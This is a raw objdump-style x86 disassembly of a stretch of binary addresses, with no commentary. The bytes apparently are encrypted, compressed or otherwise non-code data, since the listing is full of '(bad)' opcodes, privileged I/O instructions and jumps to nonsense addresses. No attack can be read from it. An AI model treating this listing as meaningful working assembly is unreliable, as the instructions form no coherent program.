  40feb4:	push   ss
  40feb5:	inc    edx
  40feb6:	mov    edi,0xb687e356
  40febb:	shr    BYTE PTR [ecx+0x165bf9ae],cl
  40fec1:	ins    BYTE PTR es:[edi],dx
  40fec2:	xor    DWORD PTR [ebx+ebp*4-0x1152ef32],esp
  40fec9:	and    BYTE PTR [ecx],al
  40fecb:	cmp    al,0xa2
  40fecd:	mov    BYTE PTR [eax],cl
  40fecf:	pop    ds
  40fed0:	add    esi,ecx
  40fed2:	pop    ebp
  40fed3:	(bad)  
  40fed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed5:	sbb    al,BYTE PTR [ecx+0x29]
  40fed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fed9:	scas   al,BYTE PTR es:[edi]
  40feda:	aad    0x81
  40fedc:	xchg   ebp,eax
  40fedd:	(bad)  
  40fedf:	mov    ebx,0xba308e2
  40fee4:	push   esi
  40fee5:	js     0x40ff13
  40fee7:	hlt    
  40fee8:	and    esp,DWORD PTR [eax+ecx*8]
  40feeb:	xchg   esp,eax
  40feec:	adc    ebx,DWORD PTR [esi]
  40feee:	dec    ebp
  40feef:	shl    edx,cl
  40fef1:	cwde   
  40fef2:	(bad)
  40fef5:	sub    bh,BYTE PTR [edi]
  40fef7:	data16 cmp bl,dh
  40fefa:	xchg   DWORD PTR [esi+0x193aedb4],edi
  40ff00:	inc    BYTE PTR [edi]
  40ff02:	pop    eax
  40ff03:	push   eax
  40ff04:	ror    DWORD PTR [ecx-0x76],0xc9
  40ff08:	sti    
  40ff09:	cmp    cl,dl
  40ff0b:	std    
  40ff0c:	inc    edi
  40ff0d:	ja     0x40ff27
  40ff0f:	ret    0x4f6a
  40ff12:	push   edx
  40ff13:	jns    0x40ff3a
  40ff15:	repz sahf 
  40ff17:	inc    edi
  40ff18:	ss es dec esp
  40ff1b:	ret    0xeb36
  40ff1e:	call   0xe919a2ab
  40ff23:	push   esp
  40ff24:	shr    BYTE PTR [esi],0xc5
  40ff27:	xchg   DWORD PTR [ebp+0x26d4dcd4],eax
  40ff2d:	mov    ebx,DWORD PTR [eax]
  40ff2f:	mov    ds:0xf11d1146,al
  40ff34:	xor    bh,dl
  40ff36:	mov    dh,0xcb
  40ff38:	out    0x72,al
  40ff3a:	icebp  
  40ff3b:	test   eax,0x34ff7549
  40ff40:	stc    
  40ff41:	push   ebp
  40ff42:	add    al,0x1c
  40ff44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff45:	(bad)  
  40ff46:	mov    eax,0x8bcc08ff
  40ff4b:	xchg   edx,eax
  40ff4c:	cmp    al,0x18
  40ff4e:	sub    eax,0xf8e9c6cd
  40ff53:	mul    DWORD PTR [edi]
  40ff55:	pop    ss
  40ff56:	enter  0x4c3b,0x14
  40ff5a:	dec    eax
  40ff5b:	pop    edx
  40ff5c:	outs   dx,DWORD PTR ds:[esi]
  40ff5d:	rol    edx,0xd6
  40ff60:	or     BYTE PTR [edx+0x7a897332],bl
  40ff66:	mov    edx,cs
  40ff68:	aad    0x4f
  40ff6a:	cmp    eax,ecx
  40ff6c:	fnstenv [esi+0xc]
  40ff6f:	sbb    DWORD PTR [ecx+0x408ef985],0x39
  40ff76:	lods   eax,DWORD PTR ds:[esi]
  40ff77:	mov    al,0x6b
  40ff79:	aam    0xb0
  40ff7b:	shl    DWORD PTR [esi-0x389b50da],1
  40ff81:	fwait
  40ff82:	push   ds
  40ff83:	ret    0xfead
  40ff86:	jno    0x40ffa3
  40ff88:	sub    cl,BYTE PTR [edx+0x59591341]
  40ff8e:	pop    esp
  40ff8f:	retf   0x5728
  40ff92:	adc    DWORD PTR [ebx+0x70],esp
  40ff95:	adc    esi,edi
  40ff97:	pop    ebp
  40ff98:	jns    0x40ffa0
  40ff9a:	inc    edi
  40ff9b:	div    BYTE PTR [ebx+0x4529af98]
  40ffa1:	inc    eax
  40ffa2:	fistp  DWORD PTR [ebx+0x46]
  40ffa5:	add    DWORD PTR ds:0x601f9c66,ebx
  40ffab:	and    eax,0x985beb4d
  40ffb0:	xor    eax,DWORD PTR [edx-0x196fb82c]
  40ffb6:	xchg   edx,eax
  40ffb7:	popa   
  40ffb8:	enter  0x9e3c,0x6a
  40ffbc:	test   BYTE PTR [edx+0x15465c0e],0x4
  40ffc3:	test   esi,ebp
  40ffc5:	retf   
  40ffc6:	ret    
  40ffc7:	cli    
  40ffc8:	les    esi,FWORD PTR [esi+0x60428b60]
  40ffce:	shl    DWORD PTR [eax-0x44],cl
  40ffd1:	mov    edx,0x5fdb4654
  40ffd6:	dec    esp
  40ffd7:	fimul  DWORD PTR [ebp-0x3d]
  40ffda:	lahf   
  40ffdb:	pushf  
  40ffdc:	(bad)  
  40ffdd:	sti    
  40ffde:	sbb    BYTE PTR [edx],ah
  40ffe0:	jp     0x41001c
  40ffe2:	pushf  
  40ffe3:	call   0x67c171f9
  40ffe8:	jo     0x41002d
  40ffea:	fcmovne st,st(4)
  40ffec:	adc    al,0x75
  40ffee:	jl     0x41004f
  40fff0:	int3   
  40fff1:	mov    ds:0x31e8bcf6,al
  40fff6:	ss clc 
  40fff8:	inc    edi
  40fff9:	(bad)  [ebx]
  40fffb:	push   ebx
  40fffc:	pop    ecx
  40fffd:	and    al,0xda
  40ffff:	stos   DWORD PTR es:[edi],eax
  410000:	loop   0x410016
  410002:	pushf  
  410003:	add    ebx,DWORD PTR [eax]
  410005:	jno    0x40ffb7
  410007:	inc    ebx
  410008:	sbb    BYTE PTR [esi-0x399ebce7],0x4c
  41000f:	sbb    DWORD PTR [ebp+0x750d6c0],0xe9f041b
  410019:	out    0x9a,al
  41001b:	cmp    eax,0x4abdafaa
  410020:	mov    edi,0x7423b1e0
  410025:	jmp    0xa9a85884
  41002a:	cmp    ch,BYTE PTR [esi]
  41002c:	xchg   edx,eax
  41002d:	jmp    0x4eed27f6
  410032:	inc    ecx
  410033:	dec    esp
  410034:	fimul  DWORD PTR [eax+0x74]
  410037:	add    BYTE PTR [ebx+eiz*2],bh
  41003a:	xchg   BYTE PTR [esp+eax*2+0x793d67a7],ch
  410041:	clc    
  410042:	jae    0x41006d
  410044:	xor    bh,bh
  410046:	push   es
  410047:	and    esi,DWORD PTR [eax+0x5d6fef93]
  41004d:	mov    edx,0xcc7d9a8e
  410052:	or     DWORD PTR [ecx+0x20458d81],ebp
  410058:	jp     0x41006f
  41005a:	lds    eax,FWORD PTR [edi]
  41005c:	jo     0x4100a5
  41005e:	jne    0x4100b9
  410060:	sub    DWORD PTR [ecx],ebx
  410062:	sub    DWORD PTR [ecx+0x63],ecx
  410065:	mov    eax,ds:0x19ef6f67
  41006a:	mov    BYTE PTR [esi+0x4],dh
  41006d:	add    cl,dl
  41006f:	jp     0x41008e
  410071:	out    dx,eax
  410072:	aas    
  410073:	add    eax,0x56e68571
  410078:	cli    
  410079:	mov    DWORD PTR [esi],edi
  41007b:	xchg   ebx,eax
  41007c:	xor    dh,dh
  41007e:	retf   
  41007f:	mov    cl,0xde
  410081:	sbb    cl,bl
  410083:	aaa    
  410084:	sbb    ah,0x29
  410087:	lahf   
  410088:	mov    eax,0xae40f712
  41008d:	std    
  41008e:	or     eax,0x6392b6f8
  410093:	mov    eax,0x97622e87
  410098:	dec    edi
  410099:	xchg   ecx,edx
  41009b:	test   edx,ecx
  41009d:	jnp    0x4100fd
  41009f:	push   0x5c
  4100a1:	pop    edi
  4100a2:	jmp    0x410089
  4100a4:	xchg   ebx,eax
  4100a5:	add    BYTE PTR [ebx-0x36dd8fef],dl
  4100ab:	inc    edx
  4100ac:	mov    ds:0xeb248ab2,eax
  4100b1:	and    al,0x6a
  4100b3:	aad    0xf9
  4100b5:	cmp    bl,dh
  4100b7:	fadd   st,st(5)
  4100b9:	leave  
  4100ba:	clc    
  4100bb:	sar    DWORD PTR [edx-0x68997023],cl
  4100c1:	inc    ebx
  4100c2:	outs   dx,DWORD PTR ds:[esi]
  4100c3:	ins    DWORD PTR es:[edi],dx
  4100c4:	rep ins DWORD PTR es:[edi],dx
  4100c6:	xchg   ebp,eax
  4100c7:	lods   al,BYTE PTR ds:[esi]
  4100c8:	daa    
  4100c9:	pop    ds
  4100ca:	out    0x7,eax
  4100cc:	add    bl,ch
  4100ce:	xor    bh,bl
  4100d0:	mov    esp,0xa8342651
  4100d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100d6:	jl     0x4100ee
  4100d8:	repz cmp BYTE PTR [ebp+0x3e],dh
  4100dc:	and    ch,cl
  4100de:	out    dx,eax
  4100df:	repz int 0xe1
  4100e2:	pop    DWORD PTR [ebp-0xd0d1177]
  4100e8:	test   DWORD PTR [ebx+0x61],edi
  4100eb:	fadd   QWORD PTR [ecx+0x38]
  4100ee:	sti    
  4100ef:	aad    0xea
  4100f1:	mov    ds:0x6718e1e1,eax
  4100f6:	nop
  4100f7:	push   ds
  4100f8:	std    
  4100f9:	imul   ecx,DWORD PTR [ecx+0x59f9dd6b],0xffffffd8
  410100:	stos   BYTE PTR es:[edi],al
  410101:	and    DWORD PTR [edi],esp
  410103:	mov    bl,0xb
  410105:	fld    TBYTE PTR [edi+0x2e]
  410108:	sub    ch,ch
  41010a:	(bad)  ds:0x5555aa7a
  410110:	sbb    ecx,eax
  410112:	add    eax,0x33a70229
  410117:	mov    esp,0x22fd7130
  41011c:	ret    0x866f
  41011f:	mov    al,0x7d
  410121:	(bad)  
  410122:	jl     0x4100f0
  410124:	mov    ah,0x42
  410126:	loopne 0x4100ac
  410128:	add    bh,bh
  41012a:	aas    
  41012b:	in     eax,0xb5
  41012d:	js     0x4100b7
  41012f:	mov    al,ds:0x1d393b31
  410134:	pop    es
  410135:	mov    ds:0x9b504c6c,eax
  41013a:	loop   0x410112
  41013c:	(bad)  
  41013e:	and    al,0x31
  410140:	dec    edx
  410141:	mov    eax,0x23d04c2d
  410146:	sbb    ebx,esp
  410148:	loopne 0x410124
  41014a:	mov    esi,DWORD PTR [ebx]
  41014c:	mov    eax,0xd6639819
  410151:	mov    al,0x1
  410153:	ins    BYTE PTR es:[edi],dx
  410154:	imul   edi,eax,0x50
  410157:	adc    al,BYTE PTR ds:0xa29ca3a3
  41015d:	shl    DWORD PTR [edi],1
  41015f:	xchg   edx,eax
  410160:	push   edx
  410161:	dec    edx
  410162:	aam    0x33
  410164:	dec    ebx
  410165:	dec    edi
  410166:	(bad)  [edx-0xe]
  410169:	ret    0x5bc7
  41016c:	lds    esi,FWORD PTR [ecx-0x31]
  41016f:	jecxz  0x410123
  410171:	jg     0x410136
  410173:	outs   dx,DWORD PTR cs:[esi]
  410175:	loopne 0x410150
  410177:	xchg   edi,eax
  410178:	call   DWORD PTR [edx+esi*8-0x31728869]
  41017f:	xor    edx,ecx
  410181:	mov    cl,0xcf
  410183:	cmp    eax,0xbf7d59aa
  410188:	(bad)  
  410189:	call   0xf73b:0x8154d88
  410190:	popf   
  410191:	lea    ebp,[edx+0x51]
  410194:	in     eax,0x89
  410196:	imul   esp,DWORD PTR [esi],0xb189b44c
  41019c:	mov    al,0x6d
  41019e:	sbb    eax,0xcebbabaf
  4101a3:	inc    ebp
  4101a4:	in     eax,dx
  4101a5:	lea    ebp,[ecx+0x3b722abc]
  4101ab:	(bad)  
  4101ad:	lock inc sp
  4101b0:	(bad)  
  4101b1:	cmp    eax,0xdcc154d2
  4101b6:	clc    
  4101b7:	xor    dl,0x7c
  4101ba:	sbb    cl,cl
  4101bc:	xor    bl,ah
  4101be:	in     al,0xc9
  4101c0:	imul   ebp,esp,0x4a
  4101c3:	inc    esi
  4101c4:	jle    0x4101d4
  4101c6:	jmp    0xcad:0xaff66cd4
  4101cd:	add    al,BYTE PTR ds:0xca339293
  4101d3:	jmp    0xe0c00fd9
  4101d8:	pop    esp
  4101d9:	xchg   edx,eax
  4101da:	push   ebx
  4101db:	mov    DWORD PTR [ebx-0x286ed4bb],ebp
  4101e1:	repnz ins BYTE PTR es:[edi],dx
  4101e3:	jne    0x4101f4
  4101e5:	sti    
  4101e6:	push   cs
  4101e7:	adc    dh,ch
  4101e9:	dec    BYTE PTR [ecx-0x2a6f5cb7]
  4101ef:	fnstcw WORD PTR [edx-0x54]
  4101f2:	popf   
  4101f3:	sbb    DWORD PTR ds:0xd78952b8,ecx
  4101f9:	out    0x4b,al
  4101fb:	dec    ecx
  4101fc:	or     eax,0xaa0dda71
  410201:	aad    0x15
  410203:	sbb    eax,0xf7dbcce
  410208:	icebp  
  410209:	loop   0x410217
  41020b:	xor    eax,0xb089fbc3
  410210:	imul   edx,DWORD PTR [ecx-0x56],0xa9901f22
  410217:	push   edi
  410218:	rcl    BYTE PTR [edx-0x2e],1
  41021b:	rcr    BYTE PTR [ecx+0x2f],cl
  41021e:	mov    ?,ebx
  410220:	cs push edi
  410222:	test   BYTE PTR [edx+esi*8-0x5e3718e4],ch
  410229:	test   eax,0xa33e91d5
  41022e:	dec    esp
  41022f:	repnz mov ecx,0x6e842619
  410235:	xor    ecx,esi
  410237:	jmp    0x410742
  41023c:	(bad)  
  41023d:	leave  
  41023e:	mov    dl,0xc9
  410241:	ror    edx,0xc9
  410244:	stos   BYTE PTR es:[edi],al
  410245:	inc    DWORD PTR [eax-0x6e]
  410248:	(bad)  
  410249:	data16 adc al,0x68
  41024c:	scas   al,BYTE PTR es:[edi]
  41024d:	popa   
  41024e:	js     0x4102c8
  410250:	push   0x7c
  410252:	js     0x4102cc
  410254:	xchg   edx,eax
  410255:	xor    ch,BYTE PTR [esi-0x7d15961f]
  41025b:	out    0xca,al
  41025d:	dec    esp
  41025e:	dec    edi
  41025f:	sbb    al,0x69
  410261:	jge    0x410289
  410263:	adc    DWORD PTR [esi],edi
  410265:	pop    edi
  410266:	sar    edi,0xf0
  410269:	add    edi,eax
  41026b:	retf   0x43af
  41026e:	mov    ch,BYTE PTR [eax+0x77855874]
  410274:	icebp  
  410275:	inc    ebx
  410276:	inc    ecx
  410277:	xchg   ebx,eax
  410278:	aas    
  410279:	inc    ebx
  41027a:	xchg   edi,eax
  41027b:	loop   0x41021e
  41027d:	rcl    DWORD PTR [edx],0x3e
  410280:	test   cl,cl
  410282:	pushf  
  410283:	shl    DWORD PTR es:[esi*1+0x6604f2db],1
  41028b:	jmp    0xfa6c9d04
  410290:	jge    0x410254
  410292:	push   cs
  410293:	or     cl,BYTE PTR [ebp-0x66eb3fa4]
  410299:	cmp    ebp,edi
  41029b:	add    al,0x93
  41029d:	out    dx,eax
  41029e:	mov    edx,0x5054323b
  4102a3:	fcomp  QWORD PTR [ebp-0x1e]
  4102a6:	in     al,0xd3
  4102a8:	in     al,0x7f
  4102aa:	stos   BYTE PTR es:[edi],al
  4102ab:	fnstsw WORD PTR [ecx+0x4a]
  4102ae:	(bad)  
  4102af:	sub    edx,ecx
  4102b1:	add    bl,BYTE PTR [eax+0x7d]
  4102b4:	mov    ebp,DWORD PTR [ebx]
  4102b6:	cli    
  4102b7:	je     0x4102ba
  4102b9:	sub    eax,0xc152d398
  4102be:	loop   0x41025f
  4102c0:	dec    edi
  4102c1:	cs jbe 0x4102dc
  4102c4:	stos   BYTE PTR es:[edi],al
  4102c5:	mov    ebp,0x12b9c8e4
  4102ca:	out    0xc3,eax
  4102cc:	out    dx,eax
  4102cd:	push   edi
  4102ce:	dec    ecx
  4102cf:	ins    DWORD PTR es:[edi],dx
  4102d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102d1:	sti    
  4102d2:	xchg   esp,eax
  4102d3:	xchg   DWORD PTR [esi],esp
  4102d5:	cmp    DWORD PTR [ecx-0x51],esi
  4102d8:	sub    ch,BYTE PTR [edi+0x16]
  4102db:	test   BYTE PTR [edi-0x3d],dl
  4102de:	not    ecx
  4102e0:	pop    esp
  4102e1:	fmul   QWORD PTR [ecx]
  4102e3:	in     eax,dx
  4102e4:	adc    dh,BYTE PTR [ecx-0x47]
  4102e7:	loop   0x410328
  4102e9:	and    ebp,eax
  4102eb:	xchg   edx,eax
  4102ec:	popf   
  4102ed:	out    0xb4,al
  4102ef:	cmp    al,0xea
  4102f1:	imul   esp,DWORD PTR [esi+ecx*2-0x345e5bc4],0x44
  4102f9:	inc    ebp
  4102fa:	jp     0x4102af
  4102fc:	fist   WORD PTR [ecx*2+0x5685dc4c]
  410303:	dec    ebp
  410304:	inc    BYTE PTR [ebx+0x24]
  410307:	daa    
  410308:	or     eax,0x7877a9f1
  41030d:	pop    edx
  41030e:	into   
  41030f:	inc    esp
  410310:	jle    0x410352
  410312:	lock (bad) 
  410314:	mov    dl,0x54
  410316:	shl    BYTE PTR [esi-0x30],1
  410319:	jmp    0xfdc703d
  41031e:	ins    BYTE PTR es:[edi],dx
  41031f:	mov    WORD PTR [esi],es
  410321:	fs cli 
  410323:	add    cl,bl
  410325:	jg     0x410388
  410327:	popa   
  410328:	fnstsw WORD PTR [edx+0x18f275b]
  41032e:	cmp    al,0x2b
  410330:	xchg   DWORD PTR [ebx+0x2b3aa1],ecx
  410336:	inc    ebp
  410337:	fwait
  410338:	aaa    
  410339:	sbb    al,0x17
  41033b:	mov    al,ds:0x645fa956
  410340:	addr16 dec esp
  410342:	add    DWORD PTR [ebx-0x2a],eax
  410345:	adc    ch,dl
  410347:	inc    esp
  410348:	pop    ebx
  410349:	jmp    0x7355:0x38062e1c
  410350:	rcl    BYTE PTR [ebx],1
  410352:	iret   
  410353:	xchg   ebx,eax
  410354:	mov    esi,DWORD PTR [edi]
  410356:	pop    edi
  410357:	daa    
  410358:	retf   0xb9b0
  41035b:	cmp    edi,DWORD PTR [ecx-0x3a22efb1]
  410361:	clc    
  410362:	cmp    BYTE PTR [edx],dl
  410364:	add    DWORD PTR [edi],esi
  410366:	pop    es
  410367:	les    eax,FWORD PTR [edi-0x1f]
  41036a:	mov    edx,0x31b4ae8e
  41036f:	push   ebp
  410370:	nop
  410371:	test   eax,0xc22ea2c2
  410376:	mov    esp,esp
  410378:	and    eax,0x171a5c36
  41037d:	push   eax
  41037e:	retf   0xb25b
  410381:	xor    BYTE PTR [ebp-0x6b],ah
  410384:	loope  0x41035d
  410386:	in     al,dx
  410387:	dec    ebp
  410388:	mul    DWORD PTR [ebx+0x19c6351c]
  41038e:	dec    DWORD PTR [eax+0x21532cb7]
  410394:	jg     0x41039b
  410396:	fild   WORD PTR [edx+ebx*8+0x51]
  41039a:	xlat   BYTE PTR ds:[ebx]
  41039b:	dec    ebp
  41039c:	outs   dx,DWORD PTR ds:[esi]
  41039d:	xor    al,0xfe
  41039f:	(bad)  
  4103a1:	sbb    esp,DWORD PTR [ebx+0x4f630a01]
  4103a7:	or     al,0x71
  4103a9:	xor    DWORD PTR [edx-0x3f],edi
  4103ac:	sbb    BYTE PTR [eax],dl
  4103ae:	adc    ebp,DWORD PTR [edi-0x20]
  4103b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103b2:	outs   dx,DWORD PTR ds:[esi]
  4103b3:	rcr    DWORD PTR ss:[ebp-0x691446e6],1
  4103ba:	mov    DWORD PTR [edi+0x5b],esp
  4103bd:	shl    DWORD PTR [ebp+0x3e47d8],cl
  4103c3:	dec    esp
  4103c4:	repz jo 0x410430
  4103c7:	pop    ecx
  4103c8:	stos   DWORD PTR es:[edi],eax
  4103c9:	inc    esi
  4103ca:	lods   al,BYTE PTR ds:[esi]
  4103cb:	pop    edx
  4103cc:	out    dx,eax
  4103cd:	mov    dl,0xd9
  4103cf:	ret    0x23b5
  4103d2:	ins    BYTE PTR es:[edi],dx
  4103d3:	push   0x70
  4103d5:	or     eax,0x6511b02d
  4103da:	test   al,0xa
  4103dc:	mov    ebx,0xd962ab83
  4103e1:	push   eax
  4103e2:	inc    eax
  4103e3:	and    dh,BYTE PTR [eax+eax*1]
  4103e6:	jnp    0x4103e2
  4103e8:	aaa    
  4103e9:	iret   
  4103ea:	and    BYTE PTR [ebx-0x580519fd],0xf2
  4103f1:	lea    esi,es:[ecx]
  4103f4:	pop    edx
  4103f5:	je     0x4103e4
  4103f7:	into   
  4103f8:	je     0x41043e
  4103fa:	push   ebx
  4103fb:	fadd   QWORD PTR [edi]
  4103fd:	add    eax,0xb43f12f8
  410402:	or     bh,BYTE PTR [di+0x53ec]
  410407:	das    
  410408:	pop    edi
  410409:	dec    eax
  41040a:	and    edx,DWORD PTR [ebx+0x69b6ab15]
  410410:	xchg   ebx,eax
  410411:	shl    dh,1
  410413:	cmp    DWORD PTR [ecx],0x66
  410416:	xchg   ebx,eax
  410417:	xchg   ebp,eax
  410418:	sbb    DWORD PTR [edx],ecx
  41041a:	jne    0x4103bc
  41041c:	mov    esi,0x8fbcd39b
  410421:	push   edi
  410422:	fld    TBYTE PTR [eax]
  410424:	mov    cs,WORD PTR [ebx]
  410426:	mul    ebp
  410428:	fwait
  410429:	int3   
  41042a:	add    bl,BYTE PTR [ebx]
  41042c:	aad    0xe0
  41042e:	or     al,0xdb
  410430:	std    
  410431:	dec    esp
  410432:	pusha  
  410433:	enter  0x795d,0xc7
  410437:	sub    BYTE PTR [ebx+0x64883ef8],ah
  41043d:	cmp    BYTE PTR [ebp-0x33b39cdc],ah
  410443:	xor    eax,ebp
  410445:	call   0x9f083d8d
  41044a:	lods   al,BYTE PTR ds:[esi]
  41044b:	add    esi,DWORD PTR [edi-0x6e]
  41044e:	shl    BYTE PTR [esi-0x186aa2ae],cl
  410454:	sti    
  410455:	mov    esp,0x52adc499
  41045a:	mov    esi,0x1b4213ef
  41045f:	dec    esp
  410460:	bound  sp,DWORD PTR [ebp-0x9]
  410464:	loopne 0x410458
  410466:	clc    
  410467:	popa   
  410468:	jge    0x4104b8
  41046a:	add    eax,0x470b63a0
  41046f:	out    dx,al
  410470:	test   eax,0x47bb8228
  410475:	fld    st(6)
  410477:	pop    esp
  410478:	xchg   ecx,eax
  410479:	mov    al,ds:0x261a588f
  41047e:	inc    ecx
  41047f:	pop    es
  410480:	push   es
  410481:	sub    eax,DWORD PTR [ebp+edx*4-0x1b]
  410485:	adc    DWORD PTR [edi],ebx
  410487:	ret    0x80b8
  41048a:	fsub   DWORD PTR [eax]
  41048c:	loop   0x4104a4
  41048e:	ss jae 0x410452
  410491:	cmp    esi,edx
  410493:	cmp    BYTE PTR [esi+0x7fecad4],ch
  410499:	mov    edx,0x53d6c4bb
  41049e:	cdq    
  41049f:	into   
  4104a0:	cmp    eax,0xc9073696
  4104a5:	mov    bh,0xbf
  4104a7:	jge    0x41050e
  4104a9:	mov    esi,DWORD PTR [edx+eiz*4-0xaafeb11]
  4104b0:	add    eax,0x24eb3085
  4104b5:	mov    ch,0x88
  4104b7:	inc    edi
  4104b8:	das    
  4104b9:	push   ecx
  4104ba:	cmp    BYTE PTR [ecx+eiz*8+0x7c7e4758],ah
  4104c1:	data16 cmp dh,bl
  4104c4:	stos   BYTE PTR es:[edi],al
  4104c5:	jae    0x4104aa
  4104c7:	or     BYTE PTR [esi-0x58],ch
  4104ca:	mov    al,0x30
  4104cc:	aaa    
  4104cd:	icebp  
  4104ce:	pushf  
  4104cf:	sub    ecx,edi
  4104d1:	mov    ds:0xb0574bee,eax
  4104d6:	and    BYTE PTR [esi-0x7c],0xf9
  4104da:	and    al,0x26
  4104dc:	shr    DWORD PTR [eax],0x98
  4104df:	scas   al,BYTE PTR es:[edi]
  4104e0:	cwde   
  4104e1:	inc    edi
  4104e2:	ficom  DWORD PTR [edx+0x71]
  4104e5:	adc    eax,0x4d9b6a75
  4104ea:	stos   BYTE PTR es:[edi],al
  4104eb:	or     bl,BYTE PTR [edi+0x6b]
  4104ee:	ins    DWORD PTR es:[edi],dx
  4104ef:	mov    dh,0x76
  4104f1:	push   0xd726fe95
  4104f6:	adc    BYTE PTR [edi],dl
  4104f8:	mov    dh,0xc5
  4104fa:	cwde   
  4104fb:	hlt    
  4104fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104fd:	fidivr WORD PTR [esi-0x61]
  410500:	cmp    eax,0xd21a1a54
  410505:	xor    BYTE PTR [edi+0x76],bh
  410508:	mov    BYTE PTR [edi],dl
  41050a:	sub    eax,esp
  41050c:	mov    esp,0xdbd52d5f
  410511:	sub    al,0x11
  410513:	aad    0x7e
  410515:	push   ebp
  410516:	pop    eax
  410517:	gs in  al,0x33
  41051a:	adc    al,0x81
  41051c:	adc    al,0xde
  41051e:	inc    ebx
  41051f:	in     eax,dx
  410520:	sub    DWORD PTR [ebx-0x126148c4],edi
  410526:	sub    esp,ebp
  410528:	js     0x41050c
  41052a:	and    eax,0x6910210d
  41052f:	lahf   
  410530:	stos   BYTE PTR es:[edi],al
  410531:	call   0x9762:0xcc66e05d
  410538:	sar    BYTE PTR [ebx],1
  41053a:	dec    edx
  41053b:	dec    esi
  41053c:	xchg   bl,dh
  41053e:	inc    esp
  41053f:	out    0x26,eax
  410541:	or     al,0x4
  410543:	ins    DWORD PTR es:[edi],dx
  410544:	loope  0x41053f
  410546:	ja     0x410559
  410548:	jnp    0x41053e
  41054a:	cwde   
  41054b:	mov    al,0x1d
  41054d:	(bad)  
  41054e:	fwait
  41054f:	and    edx,DWORD PTR [edi-0x4f]
  410552:	lods   eax,DWORD PTR ds:[esi]
  410553:	iret   
  410554:	hlt    
  410555:	push   es
  410556:	xor    al,0x23
  410558:	sahf   
  410559:	outs   dx,BYTE PTR ds:[esi]
  41055a:	lds    ebx,FWORD PTR [ecx]
  41055c:	xor    bl,BYTE PTR [eax-0x48]
  41055f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410560:	outs   dx,BYTE PTR ds:[esi]
  410561:	mov    ebx,0xfc48d34
  410566:	jne    0x2cc035dd
  41056c:	leave  
  41056d:	push   0x6
  41056f:	pusha  
  410570:	std    
  410571:	enter  0x9ef4,0x31
  410575:	inc    eax
  410576:	pushf  
  410577:	into   
  410578:	adc    eax,DWORD PTR [esi]
  41057a:	pop    esi
  41057b:	cmc    
  41057c:	nop
  41057d:	popf   
  41057e:	sbb    eax,edi
  410580:	add    edx,DWORD PTR [ebp-0x17768d6e]
  410586:	jl     0x4105a6
  410588:	push   0x280c23f4
  41058d:	lods   eax,DWORD PTR ds:[esi]
  41058e:	lahf   
  41058f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410590:	jae    0x410594
  410592:	repnz mov ss,WORD PTR [ecx+0x3301160c]
  410599:	cwde   
  41059a:	adc    bh,BYTE PTR [ecx+0x63]
  41059d:	xchg   edi,eax
  41059e:	xchg   edx,eax
  41059f:	mov    es,WORD PTR [ebx+0x2b]
  4105a2:	test   edi,ecx
  4105a4:	fcomp  DWORD PTR [ecx+0x61a7e9a8]
  4105aa:	jo     0x410599
  4105ac:	arpl   WORD PTR [esi+0x3b988b66],bp
  4105b2:	scas   al,BYTE PTR es:[edi]
  4105b3:	shr    DWORD PTR [ebx],1
  4105b5:	push   ecx
  4105b6:	xchg   BYTE PTR [ecx-0x1ebf3313],dl
  4105bc:	xchg   ebx,eax
  4105bd:	jecxz  0x4105c3
  4105bf:	mov    ds:0x19cb84b0,eax
  4105c4:	call   0x53e5:0x5ee850cf
  4105cb:	and    al,0xd1
  4105cd:	arpl   WORD PTR [edx-0x1],cx
  4105d0:	cdq    
  4105d1:	enter  0xab69,0x17
  4105d5:	in     eax,0x89
  4105d7:	mov    cl,0xa1
  4105d9:	or     bh,dh
  4105db:	cld    
  4105dc:	add    DWORD PTR [edi+edx*4],esp
  4105df:	mov    ds:0x269a96b8,al
  4105e4:	stos   DWORD PTR es:[edi],eax
  4105e5:	push   ss
  4105e6:	jae    0x4105b5
  4105e8:	jo     0x41059c
  4105ea:	mov    cl,0x69
  4105ec:	dec    BYTE PTR [edx+0x60]
  4105ef:	xchg   edx,eax
  4105f0:	inc    edx
  4105f1:	inc    ecx
  4105f2:	out    dx,eax
  4105f3:	std    
  4105f4:	ror    DWORD PTR cs:[ebx-0x48],0xa8
  4105f9:	out    dx,al
  4105fa:	push   ss
  4105fb:	pop    esp
  4105fc:	xchg   edi,eax
  4105fd:	cmp    DWORD PTR [ecx+0x57198510],0x6e
  410604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410605:	aas    
  410606:	jmp    0x694c3b9c
  41060b:	jl     0x4105d5
  41060d:	sti    
  41060e:	fxch   st(4)
  410610:	add    dh,BYTE PTR [esp+ebp*2]
  410613:	dec    BYTE PTR ds:0x89c5e744
  410619:	(bad)  
  41061a:	sub    eax,0xb83e4d0
  41061f:	mov    al,ds:0x177663c7
  410624:	jmp    0x99448116
  410629:	sti    
  41062a:	adc    DWORD PTR [eax-0x2a1c0c5e],esp
  410630:	xchg   ecx,eax
  410631:	imul   ecx,DWORD PTR [eax+0x70f18314],0xc422edba
  41063b:	push   ebp
  41063c:	aaa    
  41063d:	sbb    DWORD PTR [eax+esi*1+0x4edb3ae5],ecx
  410644:	mov    al,0x37
  410646:	sub    DWORD PTR [eax],ecx
  410648:	popf   
  410649:	cmp    bh,dh
  41064b:	add    eax,0x6fb17c95
  410650:	adc    edi,DWORD PTR [esi]
  410652:	arpl   WORD PTR ds:0xaa88a06b,bp
  410658:	mov    dl,0xfe
  41065a:	sbb    al,0xdd
  41065c:	cwde   
  41065d:	inc    ebx
  41065e:	outs   dx,DWORD PTR ds:[esi]
  41065f:	jmp    0x4106b3
  410661:	pop    edx
  410662:	dec    eax
  410663:	jge    0x4106a4
  410665:	mov    edi,0x1bd80ad1
  41066a:	xchg   ebp,eax
  41066b:	mov    edi,DWORD PTR [esi+0x3]
  41066e:	xchg   ebp,eax
  41066f:	ds int 0xcb
  410672:	mov    edi,0xf630ab0
  410677:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410679:	cmp    BYTE PTR [ecx-0x3a],bh
